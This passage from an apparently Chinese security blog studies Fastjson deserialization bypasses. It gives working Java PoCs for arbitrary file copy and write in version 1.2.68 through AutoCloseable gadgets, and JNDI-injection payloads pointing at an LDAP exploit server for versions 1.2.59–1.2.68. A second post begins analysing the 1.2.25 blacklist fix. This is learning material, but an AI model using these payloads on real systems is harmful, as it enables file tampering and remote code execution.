class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030079.png" alt="image-20230828003050698"><br>这里成功自动生成了flag.txt并且把win.ini复制了下来</p><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong><br>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了<code>setBuffer()</code>和<code>setOutputStream()</code>两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其<code>flush()</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>接着，就是要看怎么触发Output类<code>flush()</code>函数了，<code>flush()</code>函数只有在<code>close()</code>和<code>require()</code>函数被调用时才会触发，其中<code>require()</code>函数在调用write相关函数时会被触发。<br>其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其<code>setBlockDataMode()</code>函数中调用了<code>drain()</code>函数、<code>drain()</code>函数中又调用了<code>out.write()</code>函数，满足前面的需求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Creates new BlockDataOutputStream on top of given underlying stream.  </span></span><br><span class="line"><span class="comment"> * Block data mode is turned off by default.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> BlockDataOutputStream(OutputStream out) &#123;  </span><br><span class="line"> <span class="built_in">this</span>.out = out;  </span><br><span class="line"> dout = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="built_in">this</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Sets block data mode to the given mode (true == on, false == off)  </span></span><br><span class="line"><span class="comment"> * and returns the previous mode value.  If the new mode is the same as  </span></span><br><span class="line"><span class="comment"> * the old mode, no action is taken.  If the new mode differs from the  </span></span><br><span class="line"><span class="comment"> * old mode, any buffered data is flushed before switching to the new  </span></span><br><span class="line"><span class="comment"> * mode.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode == mode) &#123;  </span><br><span class="line"> <span class="keyword">return</span> blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line"> drain();  </span><br><span class="line"> blkmode = mode;  </span><br><span class="line"> <span class="keyword">return</span> !blkmode;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">...  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * Writes all buffered data from this stream to the underlying stream,  </span></span><br><span class="line"><span class="comment"> * but does not flush underlying stream.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"> <span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;  </span><br><span class="line"> <span class="keyword">return</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">if</span> (blkmode) &#123;  </span><br><span class="line"> writeBlockHeader(pos);  </span><br><span class="line"> &#125;  </span><br><span class="line"> out.write(buf, <span class="number">0</span>, pos);  </span><br><span class="line"> pos = <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"> verifySubclass();  </span><br><span class="line"> bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);  </span><br><span class="line"> handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);  </span><br><span class="line"> enableOverride = <span class="literal">false</span>;  </span><br><span class="line"> writeStreamHeader();  </span><br><span class="line"> bout.setBlockDataMode(<span class="literal">true</span>);  </span><br><span class="line"> <span class="keyword">if</span> (extendedDebugInfo) &#123;  </span><br><span class="line"> debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();  </span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line"> debugInfoStack = <span class="literal">null</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。<br>只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong><br>看到，SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SerialOutput</span><span class="params">(OutputStream out, ClassCatalog classCatalog)</span>  </span><br><span class="line"> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">  </span><br><span class="line"> <span class="built_in">super</span>(out);  </span><br><span class="line"> <span class="built_in">this</span>.classCatalog = classCatalog;  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">/* guarantee that we&#x27;ll always use the same serialization format */</span>  </span><br><span class="line">  </span><br><span class="line"> useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下，用到了Fastjson循环引用的技巧来调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"><span class="comment">//        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;targetPath\&quot;: \&quot;E:/hacked.txt\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;tempPath\&quot;: \&quot;E:/test.txt\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280031246.png" alt="image-20230828003107850"><br>这里写入文件内容其实有限制，有的特殊字符并不能直接写入到目标文件中，比如写不进PHP代码等。<br>这里就有点没懂了，我的test.txt其实是不存在的但是也利用成功了？仔细审一下SafeFileOutputStream代码（我靠GPT）</p><ul><li><code>SafeFileOutputStream(File file)</code>：构造函数接受一个File对象，它会调用另一个构造函数来初始化。它将文件的绝对路径传递给第二个构造函数，tempPath参数为null。</li><li><code>SafeFileOutputStream(String targetPath, String tempPath)</code>：这个构造函数用于初始化SafeFileOutputStream对象。它首先创建一个File对象来表示目标文件，然后调用<code>createTempFile</code>方法创建一个File对象来表示临时文件。接着，它检查目标文件是否存在，如果不存在，则创建一个新的BufferedOutputStream对象用于写入目标文件，否则将临时文件的内容复制到目标文件中。</li></ul><p>复制文件是如果tempPath存在就会直接复制，如果不存在不会创建它只是用来指定路径，但是写文件就是利用buffer参数就写入内容然后生成一个文件，但是在实际渗透中怎么利用还是没get到，难道是直接写shell？</p><h2 id="其他一些绕过黑名单的Gadget"><a href="#其他一些绕过黑名单的Gadget" class="headerlink" title="其他一些绕过黑名单的Gadget"></a>其他一些绕过黑名单的Gadget</h2><p>这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。</p><h3 id="1-2-59"><a href="#1-2-59" class="headerlink" title="1.2.59"></a>1.2.59</h3><p>com.zaxxer.hikari.HikariConfig类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>或<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-61"><a href="#1-2-61" class="headerlink" title="1.2.61"></a>1.2.61</h3><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jndiName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Object&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span>或<span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="punctuation">,</span><span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>com.caucho.config.types.ResourceRef类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.caucho.config.types.ResourceRef&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lookupName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.value&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h3><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmJndiName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;tmFromJndi&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;transactionManager&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.transactionManager&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>终于把基础的链子勉强学完了，可以看其它的了，不过这些还是得时不时看下不然一下就忘了</p><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">Fastjson反序列化漏洞(4)—1.2.68版本 – JohnFrod’s Blog</a><br><a href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java反序列化Fastjson篇04-Fastjson1.2.62-1.2.68版本反序列化漏洞 | Drunkbaby’s Blog (drun1baby.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.25-1.2.47绕过</title>
      <link href="/undefined/30141.html"/>
      <url>/undefined/30141.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-25-修复分析"><a href="#1-2-25-修复分析" class="headerlink" title="1.2.25 修复分析"></a>1.2.25 修复分析</h2><p>首先导入1.2.25版本的修复吧，在pom.xml中导入对应版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.25</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>运行一下TemplatesImpl这条链发现存在之前没有的报错<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358332.png" alt="image-20230827235812190"><br>调试一下发现来到了下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272358333.png" alt="image-20230827235838109"><br>在1.2.24版本中这里是直接调用了loadClass如下图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359037.png" alt="image-20230827235905974"><br>而在1.2.25里是调用了<code>checkAutoType</code>进去看看这个方法干了什么，这里白日梦组长根据流程画了一个流程图如下，手工复制可能会有些错误<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359164.png" alt="image-20230827235921948"><br>在<code>checkAutoType</code>中通过黑（denyList）白（acceptList）名单对类进行检验<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359242.png" alt="image-20230827235939729"><br>这里白名单默认为空，可手动添加，黑名单默认不为空，在默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行，可以看到图中就检查到了<code>com.sun</code>然后直接跳出了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308272359339.png" alt="image-20230827235957813"><br>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span 